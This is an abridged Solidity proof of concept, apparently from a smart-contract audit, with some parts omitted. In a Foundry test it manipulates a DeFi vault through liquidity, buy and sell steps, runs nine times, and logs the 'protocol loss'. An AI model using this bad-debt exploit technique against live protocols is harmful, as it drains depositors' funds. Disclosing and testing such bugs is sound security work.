...
contract BadDebt is Minter, Common {
    ...
    function unlimitLp(address baseToken, uint amount, int24 tick) public logStateChange(baseToken, "unlimited lp") {
        address pool = registry.getPool(baseToken);
...
contract Exploit is Minter, Common {
    BadDebt bad;

    function exploit(int24 tick, uint initialUsdcAmount) public {
        bad = new BadDebt();
        // mintUsdc(address(bad), initialUsdcAmount);
        ERC20(usdc).transfer(address(bad), initialUsdcAmount);
        bad.deposit(initialUsdcAmount);

        ERC20(usdc).approve(address(vault), initialUsdcAmount);
        vault.deposit(usdc, initialUsdcAmount);

        uint256 hugeAmount =  8 * initialUsdcAmount * 10**12;

        address pool = addLiquiditiy(vOne, hugeAmount*10/9);
        buy(vOne, hugeAmount);
        bad.badBuy(vOne, hugeAmount);

        removeLiquidity(vOne, 0);
        bad.unlimitLp(vOne, 10000 ether, tick);
        bad.badSell(vOne, 0);
        sellMax(vOne, 0);
        ...
        ERC20(usdc).transfer(msg.sender, currentUsdc);
    }
}
...
contract Attack is Test, Minter, Common {
    ...
    uint constant initialUsdcAmount = 3_000_000e6;
    ...
    function testBadDebt() public {
        uint256 prevVault = ERC20(usdc).balanceOf(address(vault));
        mintUsdc(address(this), initialUsdcAmount);
        int24 tick = -185820;
        for(int24 i = 0; i < 9; i++) {
            Exploit exploit = new Exploit();
            uint256 initialAmount = ERC20(usdc).balanceOf(address(this));
            ERC20(usdc).transfer(address(exploit), initialAmount);
            exploit.exploit(tick + 60 * i, initialAmount / 2);
        }

        uint currentVault = ERC20(usdc).balanceOf(address(vault));
        console.log("protocol loss:", prevVault - currentVault);
    }
}
